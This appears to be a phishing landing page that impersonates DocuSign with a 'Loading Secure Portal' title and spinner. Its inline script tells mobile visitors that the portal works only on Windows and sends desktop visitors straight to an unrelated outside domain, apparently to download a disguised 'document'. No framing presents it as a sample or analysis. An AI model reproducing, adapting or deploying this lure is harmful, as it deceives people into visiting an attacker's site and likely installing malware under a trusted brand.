
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DocuSign - Loading Secure Portal</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Arial', sans-serif;
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #333;
        }
        .container {
            text-align: center;
            background: #ffffff;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            max-width: 500px;
            width: 100%;
        }
        .logo {
            margin-bottom: 20px;
        }
        .logo img {
            width: 150px;
        }
        .message {
            font-size: 16px;
            margin: 20px 0;
            color: #555;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #e0e0e0;
            border-top: 4px solid #0078c8;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .footer {
            font-size: 12px;
            color: #999;
            margin-top: 30px;
        }
    </style>
</head>
<body>
    <script>
        // Check if the user is on a mobile device
        if (/Mobi|Android/i.test(navigator.userAgent)) {
            document.body.innerHTML = '<div class="container"><div class="message"><h2>Mobile Access Restricted</h2><p>This portal is only accessible via a Windows computer. Please use a Windows device to access and download your document.</p></div></div>';
        } else {
            // Redirect to the secure portal for Windows users
            window.location.href = "https://rusima.im/statement%20report/";
        }
    </script>
</body>
</html>
